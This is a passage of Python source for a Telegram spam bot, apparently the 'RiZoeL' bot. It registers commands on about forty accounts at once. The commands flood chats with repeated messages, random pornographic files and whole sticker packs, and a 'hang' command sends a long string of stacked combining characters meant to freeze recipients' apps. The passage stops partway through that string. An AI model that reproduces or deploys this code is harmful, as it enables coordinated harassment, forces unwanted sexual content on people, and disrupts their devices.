@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
async def bigspam(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n{hl}bigspam <count> <message to spam>\n\n{hl}bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(rizoel) == 2:
            message = str(rizoel[1])
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            if int(e.chat_id) in GROUP:
                 return await e.reply("Sorry !! I can't spam here")
            counter = int(rizoel[0])
            for _ in range(counter):
                if e.reply_to_msg_id:
                    await smex.reply(message)
                else:
                    await e.client.send_message(e.chat_id, message)
                await asyncio.sleep(0.3)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(rizoel[0])
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            for _ in range(counter):
               smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
               await gifspam(e, smex) 
               await asyncio.sleep(0.4)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            counter = int(rizoel[0])
            for _ in range(counter):
               await e.client.send_message(e.chat_id, message)
               await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sdelayspam(?: |$)(.*)" % hl))
async def delayspam(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n{hl}delayspam <sleep time> <count> <message to spam>\n\n{hl}delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."     
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        smex = await e.get_reply_message()
        Rizoel = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        Rizoelsexy = Rizoel[1:]
        if len(Rizoelsexy) == 2:
            message = str(Rizoelsexy[1])
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            counter = int(Rizoelsexy[0])
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            sleeptime = float(Rizoel[0])
            for _ in range(counter):
                if e.reply_to_msg_id:
                    await smex.reply(message)
                else:
                    await e.client.send_message(e.chat_id, message)
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:
            counter = int(Rizoelsexy[0])
            if int(e.chat_id) in GROUP:
                   return await e.reply("Sorry !! I can't spam here")
            sleeptime = float(Rizoel[0])
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            counter = int(Rizoelsexy[0])
            if int(e.chat_id) in GROUP:
                 return await e.reply("Sorry !! I can't spam here")
            sleeptime = float(Rizoel[0])
            for _ in range(counter):
                 await e.client.send_message(e.chat_id, message)
                 await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%spornspam(?: |$)(.*)" % hl))
async def pspam(e):
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(rizoel) == 1:
            counter = int(rizoel[0])
            if int(e.chat_id) in GROUP:
                text = f"Sorry !! I can't spam here"
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                 porrn = random.choice(PORMS)
                 for _ in range(counter):
                     async with e.client.action(e.chat_id, "document"):
                         smex = await e.client.send_file(e.chat_id, porrn)
                         await gifspam(e, smex) 
                     await asyncio.sleep(0.5)
        else:
            usage = f"**MODULE NAME : PORN SPAM** \n\n command: `{hl}pornspam <count>`"
            await e.reply(usage, parse_mode=None, link_preview=None )

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%spackspam(?: |$)(.*)" % hl))
async def packspam(e):
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        try:
            x = await e.get_reply_message()
            if int(e.chat_id) in GROUP:
                 return await e.reply("Sorry !! I can't spam here")
            if not (x and x.media and hasattr(x.media, "document")):
                return await e.reply("`Reply To Sticker Only.`")
            set = x.document.attributes[1]
            sset = await e.client(
                GetStickerSetRequest(
                InputStickerSetID(
                    id=set.stickerset.id,
                    access_hash=set.stickerset.access_hash,
                )
                )
            )
            pack = sset.set.short_name
            docs = [
                utils.get_input_document(x)
                for x in (
                await e.client(GetStickerSetRequest(InputStickerSetShortName(pack)))
                ).documents
            ]
            for xx in docs:
                async with e.client.action(e.chat_id, "document"):
                    await e.client.send_file(e.chat_id, file=(xx))
                    await asyncio.sleep(0.3)
        except Exception as xy:
            print(str(xy))
            usage = f"**Module Name : Pack Spam** \n\n cmd: `{hl}packspam (replying to any sticker)`"
            await e.reply(usage)


@Riz.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%shang(?: |$)(.*)" % hl))
async def hang(e):
    usage = f"**MODULE NAME : HANG SPAM** \n\n Cmd : `{hl}hang <count>`"
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        RiZoeL = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(RiZoeL) == 1:
            counter = int(RiZoeL[0])
            if int(e.chat_id) in GROUP:
                text = f"Sorry !! I can't spam here"
                await e.reply(text, parse_mode=None, link_preview=None )
            else:
                hang = f"😈꙰꙰꙰꙰꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟